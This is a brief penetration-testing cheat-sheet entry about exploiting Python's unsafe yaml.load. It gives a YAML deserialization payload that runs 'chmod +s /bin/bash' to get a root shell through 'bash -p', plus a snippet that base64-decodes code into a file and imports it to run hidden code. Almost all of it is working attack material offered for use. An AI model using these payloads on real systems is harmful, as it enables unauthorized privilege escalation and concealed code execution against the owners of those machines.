# python
For a python script, running a `yaml` module, like below:

```text-plain
#!/usr/bin/python
import yaml
class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")
        def run(self):
                return self.read_file.read()
data  = yaml.load(Execute().run())
```

use payload `!!python/object/apply:os.system ["chmod +s /bin/bash"]` in `/tmp/file.yml` to set suid on bash and get root with `/bin/bash -p`

```text-x-python
f = open("test.py",'w')
f.write(__import__("base64").b64decode("<BASE64_FILE>").decode('utf-8'))
f.close()
p=__import__("os").getcwd()
__import__("sys").path.append(p)
__import__("test").a()
```